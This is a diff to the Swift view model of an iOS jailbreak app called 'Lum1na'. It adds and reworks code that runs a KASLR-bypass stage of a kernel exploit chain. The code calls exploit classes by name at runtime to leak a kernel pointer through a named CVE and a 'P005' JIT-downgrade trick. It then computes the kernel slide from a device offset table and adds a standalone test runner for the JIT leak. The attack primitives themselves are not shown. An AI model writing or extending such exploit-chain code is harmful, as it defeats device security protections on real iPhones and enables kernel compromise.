@@ -102,7 +102,6 @@ class Lum1naViewModel: ObservableObject {
         exploitState.description
     }
     
-    // FIXED: Use JailbreakStage from Lum1naTheme.swift
     var currentStage: JailbreakStage {
         switch exploitState {
         case .idle: return .idle
@@ -121,7 +120,10 @@ class Lum1naViewModel: ObservableObject {
     init() {
         detectDevice()
         log("Lum1na initialized", level: .info)
-        log("Target: A14 23F77", level: .info)
+        
+        // Log which offset table we're using
+        let tag = LabOffsetsBridge.shared.currentTag()
+        log("Device profile: \(tag)", level: .info)
     }
     
     func detectDevice() {
@@ -172,6 +174,7 @@ class Lum1naViewModel: ObservableObject {
         Task {
             let result = await performKASLRStage()
             if let slide = result {
+                currentKSlide = slide
                 log("[+] AKS Success: slide=0x\(String(slide, radix: 16))", level: .success)
             } else {
                 log("[-] AKS Failed", level: .error)
@@ -254,6 +257,29 @@ class Lum1naViewModel: ObservableObject {
         }
     }
     
+    func testP005() {
+        guard !isRunning else { return }
+        isRunning = true
+        clearConsole()
+        
+        Task {
+            exploitState = .executingKASLR
+            log("[*] Testing P005 JIT...", level: .info)
+            
+            let slide = tryP005()
+            
+            if let s = slide {
+                currentKSlide = s
+                log("[+] P005 Success: slide=0x\(String(s, radix: 16))", level: .success)
+            } else {
+                log("[-] P005 Failed", level: .error)
+            }
+            
+            isRunning = false
+            exploitState = .idle
+        }
+    }
+    
     // MARK: - Full Chain
     
     private func executeFullChain() async {
@@ -275,98 +301,98 @@ class Lum1naViewModel: ObservableObject {
     // MARK: - Stage Implementations
     
     private func performKASLRStage() async -> UInt64? {
-    exploitState = .executingKASLR
-    log("[*] Stage: KASLR Bypass", level: .info)
+        exploitState = .executingKASLR
+        log("[*] Stage: KASLR Bypass", level: .info)
+        
+        // Try AKS first
+        log("[*] ├─ Trying CVE-2026-65343-AKS...", level: .info)
+        if let slide = tryAKS() {
+            log("[+] ├─ AKS succeeded", level: .success)
+            return slide
+        }
+        
+        // Fallback to P005
+        log("[*] ├─ AKS failed, trying P005-JIT...", level: .info)
+        if let slide = tryP005() {
+            log("[+] ├─ P005 succeeded", level: .success)
+            return slide
+        }
+        
+        log("[-] ├─ All KASLR methods failed", level: .error)
+        return nil
+    }
     
-    // Try AKS first
-    log("[*] ├─ Trying CVE-2026-65343-AKS...", level: .info)
-    if let slide = tryAKS() {
-        log("[+] ├─ AKS succeeded", level: .success)
+    private func tryAKS() -> UInt64? {
+        guard let cls = NSClassFromString("CVE_2026_65343_AKS") as? NSObject.Type,
+              let inst = cls.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject,
+              inst.responds(to: NSSelectorFromString("leakKernelSlide")) else {
+            return nil
+        }
+        
+        let result = inst.perform(NSSelectorFromString("leakKernelSlide"))?.takeUnretainedValue() as? NSNumber
+        return result?.uint64Value != 0 ? result?.uint64Value : nil
+    }
+    
+    private func tryP005() -> UInt64? {
+        guard let cls = NSClassFromString("P005JIT") as? NSObject.Type,
+              let inst = cls.init() as? NSObject else {
+            return nil
+        }
+        
+        // initP005
+        let initSel = NSSelectorFromString("initP005")
+        guard inst.responds(to: initSel),
+              let initResult = inst.perform(initSel)?.takeUnretainedValue() as? NSNumber,
+              initResult.boolValue else {
+            log("[!] P005 init failed (missing JIT entitlement?)", level: .error)
+            return nil
+        }
+        
+        // setupJITContext
+        let setupSel = NSSelectorFromString("setupJITContext")
+        guard inst.responds(to: setupSel),
+              let setupResult = inst.perform(setupSel)?.takeUnretainedValue() as? NSNumber,
+              setupResult.boolValue else {
+            return nil
+        }
+        
+        // triggerJITDowngrade
+        let triggerSel = NSSelectorFromString("triggerJITDowngrade")
+        guard inst.responds(to: triggerSel) else { return nil }
+        inst.perform(triggerSel)
+        
+        // obtainKernelLeak
+        let leakSel = NSSelectorFromString("obtainKernelLeak")
+        guard inst.responds(to: leakSel),
+              let leakResult = inst.perform(leakSel)?.takeUnretainedValue() as? NSNumber,
+              leakResult.boolValue else {
+            return nil
+        }
+        
+        // getLeakedKernelAddress
+        let addrSel = NSSelectorFromString("getLeakedKernelAddress")
+        guard inst.responds(to: addrSel) else { return nil }
+        let addrResult = inst.perform(addrSel)?.takeUnretainedValue() as? NSNumber
+        let leakedPtr = addrResult?.uint64Value ?? 0
+        
+        guard leakedPtr != 0 else { return nil }
+        
+        // Calculate slide using runtime kernel base
+        let kernelBase = LabOffsetsBridge.shared.loadOffsets()?.slidePage ?? 0xFFFFFFF007004000
+        let slide = leakedPtr - kernelBase
+        
+        guard slide < 0x100000000 && (slide & 0x3FFF) == 0 else {
+            return nil
+        }
+        
+        // cleanup
+        let cleanupSel = NSSelectorFromString("cleanup")
+        if inst.responds(to: cleanupSel) {
+            inst.perform(cleanupSel)
+        }
+        
         return slide
     }
-    
-    // Fallback to P005
-    log("[*] ├─ AKS failed, trying P005-JIT...", level: .info)
-    if let slide = tryP005() {
-        log("[+] ├─ P005 succeeded", level: .success)
-        return slide
-    }
-    
-    log("[-] ├─ All KASLR methods failed", level: .error)
-    return nil
-}
-
-private func tryAKS() -> UInt64? {
-    guard let cls = NSClassFromString("CVE_2026_65343_AKS") as? NSObject.Type,
-          let inst = cls.perform(NSSelectorFromString("sharedInstance"))?.takeUnretainedValue() as? NSObject,
-          inst.responds(to: NSSelectorFromString("leakKernelSlide")) else {
-        return nil
-    }
-    
-    let result = inst.perform(NSSelectorFromString("leakKernelSlide"))?.takeUnretainedValue() as? NSNumber
-    return result?.uint64Value != 0 ? result?.uint64Value : nil
-}
-
-private func tryP005() -> UInt64? {
-    guard let cls = NSClassFromString("P005JIT") as? NSObject.Type,
-          let inst = cls.init() as? NSObject else {
-        return nil
-    }
-    
-    // initP005
-    let initSel = NSSelectorFromString("initP005")
-    guard inst.responds(to: initSel),
-          let initResult = inst.perform(initSel)?.takeUnretainedValue() as? NSNumber,
-          initResult.boolValue else {
-        log("[!] P005 init failed (missing JIT entitlement?)", level: .error)
-        return nil
-    }
-    
-    // setupJITContext
-    let setupSel = NSSelectorFromString("setupJITContext")
-    guard inst.responds(to: setupSel),
-          let setupResult = inst.perform(setupSel)?.takeUnretainedValue() as? NSNumber,
-          setupResult.boolValue else {
-        return nil
-    }
-    
-    // triggerJITDowngrade
-    let triggerSel = NSSelectorFromString("triggerJITDowngrade")
-    guard inst.responds(to: triggerSel) else { return nil }
-    inst.perform(triggerSel)
-    
-    // obtainKernelLeak
-    let leakSel = NSSelectorFromString("obtainKernelLeak")
-    guard inst.responds(to: leakSel),
-          let leakResult = inst.perform(leakSel)?.takeUnretainedValue() as? NSNumber,
-          leakResult.boolValue else {
-        return nil
-    }
-    
-    // getLeakedKernelAddress
-    let addrSel = NSSelectorFromString("getLeakedKernelAddress")
-    guard inst.responds(to: addrSel) else { return nil }
-    let addrResult = inst.perform(addrSel)?.takeUnretainedValue() as? NSNumber
-    let leakedPtr = addrResult?.uint64Value ?? 0
-    
-    guard leakedPtr != 0 else { return nil }
-    
-    // Calculate slide from leaked kernel pointer
-    let kernelBase = 0xFFFFFFF007004000ULL
-    let slide = leakedPtr - kernelBase
-    
-    guard slide < 0x100000000ULL && (slide & 0x3FFF) == 0 else {
-        return nil
-    }
-    
-    // cleanup
-    let cleanupSel = NSSelectorFromString("cleanup")
-    if inst.responds(to: cleanupSel) {
-        inst.perform(cleanupSel)
-    }
-    
-    return slide
-}
     
     // MARK: - Helpers
     
